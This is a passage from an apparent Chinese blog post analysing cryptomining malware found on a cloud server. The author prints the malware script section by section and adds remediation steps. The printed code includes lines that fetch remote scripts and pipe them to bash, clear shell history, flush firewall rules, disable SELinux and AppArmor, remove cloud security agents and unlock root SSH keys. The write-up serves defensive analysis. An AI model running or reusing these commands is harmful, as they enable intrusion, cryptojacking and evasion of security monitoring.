<span class="line"><span>tcp        0      0 0.0.0.0:XXXX           0.0.0.0:*               LISTEN      28838/sshd     本机正在的ssh</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span></span></span>
<span class="line"><span>chattr -ia /etc/ssh/sshd_config </span></span>
<span class="line"><span>编辑</span></span>
<span class="line"><span>vi /etc/ssh/sshd_config </span></span>
<span class="line"><span>把恶意的端口22和11222 关闭掉</span></span>
<span class="line"><span>vi /etc/ssh/sshd_config</span></span>
<span class="line"><span>systemctl restart sshd </span></span>
<span class="line"><span></span></span>
<span class="line"><span># netstat -tunpl|grep ssh</span></span>
<span class="line"><span>tcp        0      0 0.0.0.0:60920           0.0.0.0:*               LISTEN      1214/sshd</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="在某云控制台中设置安全组只运行自己的ip登录ssh" tabindex="-1"><a class="header-anchor" href="#在某云控制台中设置安全组只运行自己的ip登录ssh"><span>在某云控制台中设置安全组只运行自己的ip登录SSH</span></a></h2><p><img src="https://imgoss.xgss.net/picgo/image-20230817101528002.png?aliyun" alt="image-20230817101528002"></p><p>保证其他人无法登录ssh</p><h1 id="下载恶意代码分析" tabindex="-1"><a class="header-anchor" href="#下载恶意代码分析"><span>下载恶意代码分析</span></a></h1><p>下载恶意脚本的代码，看一下如何解决这个问题，一段一段的来分析是怎么挂马的</p><h2 id="_1-修改-resolv-conf文件" tabindex="-1"><a class="header-anchor" href="#_1-修改-resolv-conf文件"><span>1.修改 resolv.conf文件</span></a></h2><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>于是我决定下载 http://XXX.XXX.XXX.XXX/php/php_8020.sh 然后分析一下</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h3 id="恶意代码" tabindex="-1"><a class="header-anchor" href="#恶意代码"><span>恶意代码：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#!/bin/bash -e</span></span>
<span class="line"><span></span></span>
<span class="line"><span>VERSION=22.06</span></span>
<span class="line"><span>ulimit -n 65535 </span></span>
<span class="line"><span>function SetupNameServers(){  </span></span>
<span class="line"><span>grep -q 8.8.8.8 /etc/resolv.conf || ${CHATTR} -i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null; tntrecht -i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null; echo &quot;nameserver 8.8.8.8&quot; &gt;&gt; /etc/resolv.conf; ${CHATTR} +i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null; tntrecht +i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null</span></span>
<span class="line"><span>grep -q 8.8.4.4 /etc/resolv.conf || ${CHATTR} -i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null; tntrecht -i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null; echo &quot;nameserver 8.8.4.4&quot; &gt;&gt; /etc/resolv.conf; ${CHATTR} +i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null; tntrecht +i /etc/resolv.conf 2&gt;/dev/null 1&gt;/dev/null</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>SetupNameServers</span></span>
<span class="line"><span></span></span>
<span class="line"><span>修改dns</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决" tabindex="-1"><a class="header-anchor" href="#解决"><span>解决</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>vi  /etc/resolv.conf</span></span>
<span class="line"><span>options timeout:2 attempts:3 rotate single-request-reopen</span></span>
<span class="line"><span>; generated by /usr/sbin/dhclient-script</span></span>
<span class="line"><span>nameserver 100.100.2.136</span></span>
<span class="line"><span>nameserver 100.100.2.138</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>nameserver 8.8.8.8</span></span>
<span class="line"><span>nameserver 8.8.4.4</span></span>
<span class="line"><span>把文件改成</span></span>
<span class="line"><span>vi  /etc/resolv.conf</span></span>
<span class="line"><span>options timeout:2 attempts:3 rotate single-request-reopen</span></span>
<span class="line"><span>; generated by /usr/sbin/dhclient-script</span></span>
<span class="line"><span>nameserver 100.100.2.136</span></span>
<span class="line"><span>nameserver 100.100.2.138</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_2-搜索关键字" tabindex="-1"><a class="header-anchor" href="#_2-搜索关键字"><span>2.搜索关键字</span></a></h2><h3 id="恶意代码-1" tabindex="-1"><a class="header-anchor" href="#恶意代码-1"><span>恶意代码：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>if [ -f ~/ /home -maxdepth 6 -name &#39;trc20usdt&#39; ] # 它在指定的目录（~ 或 /home）下搜索名为 &#39;trc20usdt&#39; 的文件，并且搜索的深度不超过 6 层子目录。如果找到了符合条件的文件，条件将被视为满足，对应的代码块将会执行。</span></span>
<span class="line"><span>  then</span></span>
<span class="line"><span>    echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>    curl 6nj0me.XXXX.io  # 上报地址做了修改。</span></span>
<span class="line"><span>    curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;TronWeb&#39; ]</span></span>
<span class="line"><span>    then</span></span>
<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>      curl 6nj0me.XXX.io # 地址做了修改</span></span>
<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>      history -c </span></span>
<span class="line"><span>      </span></span>
<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;hdkey&#39; ]</span></span>
<span class="line"><span>    then</span></span>
<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>      history -c </span></span>
<span class="line"><span>      </span></span>
<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;ethers&#39; ]</span></span>
<span class="line"><span>    then</span></span>
<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>      history -c </span></span>
<span class="line"><span>      </span></span>
<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;web3&#39; ]</span></span>
<span class="line"><span>    then</span></span>
<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>      history -c </span></span>
<span class="line"><span>      </span></span>
<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;wormhole&#39; ]</span></span>
<span class="line"><span>    then</span></span>
<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>      history -c </span></span>
<span class="line"><span>      </span></span>
<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;bitcoin&#39; ]</span></span>
<span class="line"><span>    then</span></span>
<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>      history -c </span></span>
<span class="line"><span>      </span></span>
<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;binance&#39; ]</span></span>
<span class="line"><span>    then</span></span>
<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>      history -c </span></span>
<span class="line"><span>      </span></span>
<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;ethereum&#39; ]</span></span>
<span class="line"><span>    then</span></span>
<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>      history -c </span></span>
<span class="line"><span>      </span></span>
<span class="line"><span>  elif [ -f ~/ /home -maxdepth 6 -name &#39;hdwallet&#39; ]</span></span>
<span class="line"><span>    then</span></span>
<span class="line"><span>      echo &quot;Crypto running&quot;</span></span>
<span class="line"><span>      curl 6nj0me.xxx.io</span></span>
<span class="line"><span>      curl -fsSL http://XX.XX.XX.XX/php/php.sh | bash </span></span>
<span class="line"><span>      history -c </span></span>
<span class="line"><span>      </span></span>
<span class="line"><span>  else</span></span>
<span class="line"><span>      echo &quot;not Crypto running &quot;</span></span>
<span class="line"><span>fi</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="恶意代码分析" tabindex="-1"><a class="header-anchor" href="#恶意代码分析"><span>恶意代码分析</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>这段代码是一个 Bash 脚本，用于检测系统中是否存在一系列文件，并根据文件的存在与否执行相应的操作。脚本的大致逻辑如下：</span></span>
<span class="line"><span></span></span>
<span class="line"><span>1. 首先，通过一系列条件判断检查系统中是否存在特定的文件（文件名），这些文件名都与加密货币相关。</span></span>
<span class="line"><span>2. 如果找到其中一个文件，表示系统中可能正在运行加密货币软件，脚本会输出 &quot;Crypto running&quot;，然后执行以下操作：</span></span>
<span class="line"><span>   - 向 `6nj0me.xxx.io` 发送请求（可能用于跟踪感染的主机）。</span></span>
<span class="line"><span>   - 从 `http://XX.XX.XX.XX/php/php.sh` 下载一个 PHP 脚本，并执行它（可能用于安装恶意软件或挖矿程序）。</span></span>
<span class="line"><span>   - 清除命令历史记录，使用 `history -c` 命令删除执行过的命令记录，以尽量隐藏操作。</span></span>
<span class="line"><span>3. 如果没有找到上述任何文件，脚本会输出 &quot;not Crypto running&quot;。</span></span>
<span class="line"><span></span></span>
<span class="line"><span>需要注意的是，这段代码的意图看起来是在检查系统中是否存在特定的文件，如果存在，则执行一些恶意操作。这可能是一种恶意软件或入侵活动。如果你发现类似的代码在你的系统上运行，强烈建议立即采取行动，清除恶意脚本，并采取措施来保护你的系统。如果不确定如何处理，请寻求专业的技术支持。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决-1" tabindex="-1"><a class="header-anchor" href="#解决-1"><span>解决</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>find /home -maxdepth 6 -name &#39;trc20usdt&#39;</span></span>
<span class="line"><span>find / -maxdepth 6 -name &#39;trc20usdt&#39;</span></span>
<span class="line"><span>find /  -maxdepth 6 -name &#39;ethers&#39;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>...</span></span>
<span class="line"><span>搜索不到什么。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_3-判断xmrig-log" tabindex="-1"><a class="header-anchor" href="#_3-判断xmrig-log"><span>3.判断xmrig.log</span></a></h2><h3 id="恶意代码-2" tabindex="-1"><a class="header-anchor" href="#恶意代码-2"><span>恶意代码：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>if [ -f &quot;/etc/.system/php/xmrig.log&quot; ]</span></span>
<span class="line"><span>then</span></span>
<span class="line"><span>    echo &quot;process possible running&quot;</span></span>
<span class="line"><span>    current=$(date +%s)</span></span>
<span class="line"><span>    last_modified=$(stat -c &quot;%Y&quot; /etc/.system/php/xmrig.log)</span></span>
<span class="line"><span>   if [ $(($current-$last_modified)) -gt 600 ]; then</span></span>
<span class="line"><span>        echo &quot;no rr process running&quot;;</span></span>
<span class="line"><span>    else</span></span>
<span class="line"><span>    echo &quot;rr process running&quot;</span></span>
<span class="line"><span>    exit 1</span></span>
<span class="line"><span>   fi</span></span>
<span class="line"><span>else </span></span>
<span class="line"><span>    echo &quot;rr process not running&quot;</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>解释：</span></span>
<span class="line"><span>这段代码用于检查一个特定的日志文件是否存在，然后检查该文件的上次修改时间，如果文件的上次修改时间超过10分钟，脚本会打印 &quot;no rr process running&quot;，表示未发现 &quot;rr&quot; 进程正在运行。如果文件的上次修改时间在10分钟之内，脚本会打印 &quot;rr process running&quot;，并退出脚本。如果文件不存在，则脚本会打印 &quot;rr process not running&quot;。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_4-iptables-f" tabindex="-1"><a class="header-anchor" href="#_4-iptables-f"><span>4.iptables -F</span></a></h2><p>当你运行 iptables -F 命令时，它会清空（删除）当前已经定义的所有规则，恢复防火墙到初始状态。这将导致系统的防火墙规则被移除，网络流量将不再受到任何防火墙规则的限制。换句话说，所有之前定义的规则都将被删除，允许所有的网络流量自由通过。</p><h3 id="恶意代码-3" tabindex="-1"><a class="header-anchor" href="#恶意代码-3"><span>恶意代码</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>iptables -F</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="_5-关闭防火墙和安全软件等" tabindex="-1"><a class="header-anchor" href="#_5-关闭防火墙和安全软件等"><span>5.关闭防火墙和安全软件等</span></a></h2><h3 id="恶意代码-4" tabindex="-1"><a class="header-anchor" href="#恶意代码-4"><span>恶意代码</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>export RRHOME=/etc/.system/php</span></span>
<span class="line"><span>rm -rf $RRHOME</span></span>
<span class="line"><span>mkdir $RRHOME -p</span></span>
<span class="line"><span></span></span>
<span class="line"><span>rm -rf /var/log/syslog</span></span>
<span class="line"><span>chattr -iua /tmp/     # 允许对 /tmp/ 目录进行修改、更新和追加操作</span></span>
<span class="line"><span>chattr -iua /var/tmp/ # 使用 chattr 命令修改 /var/tmp/ 目录的属性，取消不可修改、不可更新和不可追加属性。</span></span>
<span class="line"><span>ufw disable #  关闭Ubuntu的防火墙， Uncomplicated Firewall（UFW），这是一个用于配置 iptables 防火墙规则的前端工具。</span></span>
<span class="line"><span>iptables -F  # iptables -F是用于清除所有的防火墙规则和计数器，即将所有的iptables规则设置为默认值，从而可以清空当前的防火墙策略。</span></span>
<span class="line"><span>sudo sysctl kernel.nmi_watchdog=0</span></span>
<span class="line"><span>sysctl kernel.nmi_watchdog=0</span></span>
<span class="line"><span>echo &#39;0&#39; &gt; /proc/sys/kernel/nmi_watchdog</span></span>
<span class="line"><span>echo &#39;kernel.nmi_watchdog=0&#39; &gt;&gt;/etc/sysctl.conf</span></span>
<span class="line"><span>这一系列操作似乎是用于禁用 NMI（Non-Maskable Interrupt）看门狗，在某些情况下可以防止系统被死锁等问题影响。</span></span>
<span class="line"><span></span></span>
<span class="line"><span>chattr -iae /root/.ssh/</span></span>
<span class="line"><span>chattr -iae /root/.ssh/authorized_keys</span></span>
<span class="line"><span>rm -rf /tmp/addres*</span></span>
<span class="line"><span>rm -rf /tmp/walle*</span></span>
<span class="line"><span>rm -rf /tmp/keys</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决方法" tabindex="-1"><a class="header-anchor" href="#解决方法"><span>解决方法</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>vi /etc/sysctl.conf</span></span>
<span class="line"><span>kernel.nmi_watchdog=0 去掉</span></span>
<span class="line"><span></span></span>
<span class="line"><span>echo &#39;1&#39; &gt; /proc/sys/kernel/nmi_watchdog</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_6-关闭某云的安全软件" tabindex="-1"><a class="header-anchor" href="#_6-关闭某云的安全软件"><span>6.关闭某云的安全软件</span></a></h2><h3 id="恶意代码-5" tabindex="-1"><a class="header-anchor" href="#恶意代码-5"><span>恶意代码：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>if ps aux | grep -i &#39;[a]liyun&#39;; then</span></span>
<span class="line"><span>  curl http://update.aegis.aliyun.com/download/uninstall.sh | bash</span></span>
<span class="line"><span>  curl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash</span></span>
<span class="line"><span>  pkill aliyun-service</span></span>
<span class="line"><span>  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service</span></span>
<span class="line"><span>  rm -rf /usr/local/aegis*</span></span>
<span class="line"><span>  systemctl stop aliyun.service</span></span>
<span class="line"><span>  systemctl disable aliyun.service</span></span>
<span class="line"><span>  service bcm-agent stop</span></span>
<span class="line"><span>  yum remove bcm-agent -y</span></span>
<span class="line"><span>  apt-get remove bcm-agent -y</span></span>
<span class="line"><span>elif ps aux | grep -i &#39;[y]unjing&#39;; then</span></span>
<span class="line"><span>  /usr/local/qcloud/stargate/admin/uninstall.sh</span></span>
<span class="line"><span>  /usr/local/qcloud/YunJing/uninst.sh</span></span>
<span class="line"><span>  /usr/local/qcloud/monitor/barad/admin/uninstall.sh</span></span>
<span class="line"><span>fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>if [ -f /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh ]; then</span></span>
<span class="line"><span>  /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop &amp;&amp; /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove &amp;&amp; rm -rf /usr/local/cloudmonitor  </span></span>
<span class="line"><span>else</span></span>
<span class="line"><span>  export ARCH=amd64</span></span>
<span class="line"><span>  if [ -f /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} ]; then</span></span>
<span class="line"><span>    /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} stop &amp;&amp; /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} uninstall &amp;&amp; rm -rf /usr/local/cloudmonitor </span></span>
<span class="line"><span>  else</span></span>
<span class="line"><span>    echo &quot;ali cloud monitor not running&quot;</span></span>
<span class="line"><span>  fi</span></span>
<span class="line"><span>fi</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决-2" tabindex="-1"><a class="header-anchor" href="#解决-2"><span>解决</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>这条没有生效，某的监控还是在运行</span></span>
<span class="line"><span></span></span>
<span class="line"><span># ps aux | grep -i &#39;[a]liyun&#39;</span></span>
<span class="line"><span>root     13457  0.5  0.2 101296  8900 ?        S&lt;sl Mar31 1000:29 /usr/local/aegis/aegis_client/aegis_11_55/AliYunDun</span></span>
<span class="line"><span>root     13467  1.7  0.7 145768 26980 ?        S&lt;sl Mar31 3579:27 /usr/local/aegis/aegis_client/aegis_11_55/AliYunDunMonitor</span></span>
<span class="line"><span>root     15055  0.0  0.1  43464  4528 ?        S&lt;sl May15 121:01 /usr/local/aegis/aegis_update/AliYunDunUpdate</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_7-禁用selinux-以及关闭aliyun-service" tabindex="-1"><a class="header-anchor" href="#_7-禁用selinux-以及关闭aliyun-service"><span>7.禁用SELinux 以及关闭aliyun.service</span></a></h2><h3 id="恶意代码-6" tabindex="-1"><a class="header-anchor" href="#恶意代码-6"><span>恶意代码：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>setenforce 0</span></span>
<span class="line"><span>echo SELINUX=disabled &gt;/etc/selinux/config</span></span>
<span class="line"><span>service apparmor stop</span></span>
<span class="line"><span>systemctl disable apparmor</span></span>
<span class="line"><span>service aliyun.service stop</span></span>
<span class="line"><span>systemctl disable aliyun.service</span></span>
<span class="line"><span>ps aux | grep -v grep | grep &#39;aegis&#39; | awk &#39;{print $2}&#39; | xargs -I % kill -9 %</span></span>
<span class="line"><span>ps aux | grep -v grep | grep &#39;Yun&#39; | awk &#39;{print $2}&#39; | xargs -I % kill -9 %</span></span>
